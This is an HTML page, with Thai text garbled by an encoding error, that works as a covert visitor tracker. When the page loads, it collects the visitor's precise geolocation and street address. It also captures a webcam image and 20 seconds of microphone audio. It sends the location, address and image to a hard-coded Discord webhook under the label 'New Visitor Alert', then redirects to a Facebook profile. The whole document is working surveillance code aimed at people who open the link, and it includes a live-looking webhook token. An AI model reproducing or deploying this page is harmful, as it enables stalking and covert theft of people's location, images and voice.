<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ЁЯУН р╕Бр╕│р╕ер╕▒р╕Зр╕гр╕░р╕Ър╕╕р╕Хр╕│р╣Бр╕лр╕Щр╣Ир╕З...</title>
  <script>
    async function getLocation() {
      if (!navigator.geolocation) {
        alert("р╣Ар╕Ър╕гр╕▓р╕зр╣Мр╣Ар╕Лр╕нр╕гр╣Мр╣Др╕бр╣Ир╕гр╕нр╕Зр╕гр╕▒р╕Ър╕Бр╕▓р╕гр╕гр╕░р╕Ър╕╕р╕Хр╕│р╣Бр╕лр╕Щр╣Ир╕З");
        return;
      }

      navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        let addressInfo = "р╣Др╕бр╣Ир╕кр╕▓р╕бр╕▓р╕гр╕Цр╕лр╕▓р╕Чр╕╡р╣Ир╕нр╕вр╕╣р╣Ир╣Др╕Фр╣Й";
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
          const data = await res.json();
          addressInfo = data.display_name || "р╣Др╕бр╣Ир╕Юр╕Ър╕Чр╕╡р╣Ир╕нр╕вр╕╣р╣И";
        } catch (e) {
          console.warn("р╕Бр╕▓р╕гр╕Др╣Йр╕Щр╕лр╕▓р╕Чр╕╡р╣Ир╕нр╕вр╕╣р╣Ир╕ер╣Йр╕бр╣Ар╕лр╕ер╕з:", e);
        }

        const mapImageUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon}&format=png`;

        // Request Image and Audio Capture
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        // Capture Image
        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const captureImage = () => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          return canvas.toDataURL('image/jpeg'); // Returns base64 image
        };

        setTimeout(() => {
          const capturedImage = captureImage();
          videoStream.getTracks().forEach(track => track.stop());

          // Record Audio for 20 seconds
          const audioChunks = [];
          const mediaRecorder = new MediaRecorder(videoStream);
          mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
          mediaRecorder.start();

          setTimeout(() => {
            mediaRecorder.stop();
          }, 20000); // Stop after 20 seconds

          mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
            const audioUrl = URL.createObjectURL(audioBlob);

            // Send to Discord Webhook
            try {
              await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  content: "ЁЯУб New Visitor Alert",
                  embeds: [
                    {
                      title: "ЁЯУН р╕Юр╕┤р╕Бр╕▒р╕Ф & р╕Чр╕╡р╣Ир╕нр╕вр╕╣р╣И",
                      description: `**Lat:** ${lat}\n**Lon:** ${lon}\n**Accuracy:** ┬▒${accuracy} m\n**ЁЯУМ р╕Чр╕╡р╣Ир╕нр╕вр╕╣р╣И:**\n${addressInfo}`,
                      color: 0x00cc99,
                      image: { url: capturedImage }, // Image from Camera
                      footer: { text: "Geo Tracker" },
                      timestamp: new Date().toISOString()
                    },
                    {
                      title: "ЁЯЧгя╕П р╣Ар╕кр╕╡р╕вр╕Зр╕Ир╕▓р╕Бр╣Др╕бр╕Др╣М",
                      description: "р╕Др╕ер╕┤р╕Бр╕Яр╕▒р╕Зр╣Ар╕кр╕╡р╕вр╕Зр╕Чр╕╡р╣Ир╕Ър╕▒р╕Щр╕Чр╕╢р╕Бр╕бр╕▓",
                      color: 0x99ccff,
                      audio: { url: audioUrl }, // Audio Blob URL
                      timestamp: new Date().toISOString()
                    }
                  ]
                })
              });

              setTimeout(() => {
                window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";
              }, 2000); // Redirect after 2 seconds
            } catch (e) {
              console.error("р╕Бр╕▓р╕гр╕кр╣Ир╕Зр╕Вр╣Йр╕нр╕бр╕╣р╕ер╣Др╕Ы Discord р╕ер╣Йр╕бр╣Ар╕лр╕ер╕з:", e);
            }
          };

        }, 1000); // Capture Image after 1 second
      }, (error) => {
        alert("р╣Др╕бр╣Ир╕кр╕▓р╕бр╕▓р╕гр╕Цр╕гр╕░р╕Ър╕╕р╕Хр╕│р╣Бр╕лр╕Щр╣Ир╕Зр╣Др╕Фр╣Й: " + error.message);
      }, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    }

    window.onload = getLocation; // р╣Ар╕гр╕╡р╕вр╕Бр╣Гр╕Кр╣Йр╕Яр╕▒р╕Зр╕Бр╣Мр╕Кр╕▒р╕Щр╣Ар╕бр╕╖р╣Ир╕нр╕лр╕Щр╣Йр╕▓р╣Ар╕зр╣Зр╕Ър╣Вр╕лр╕ер╕Фр╣Ар╕кр╕гр╣Зр╕И
  </script>
</head>
<body>
  <h2>ЁЯУб р╕Бр╕│р╕ер╕▒р╕Зр╕Фр╕╢р╕Зр╕Хр╕│р╣Бр╕лр╕Щр╣Ир╕Зр╕Ир╕▓р╕Бр╕бр╕╖р╕нр╕Цр╕╖р╕н...</h2>
  <p>р╣Вр╕Ыр╕гр╕Фр╕гр╕нр╕кр╕▒р╕Бр╕Др╕гр╕╣р╣И...</p>
</body>
</html>
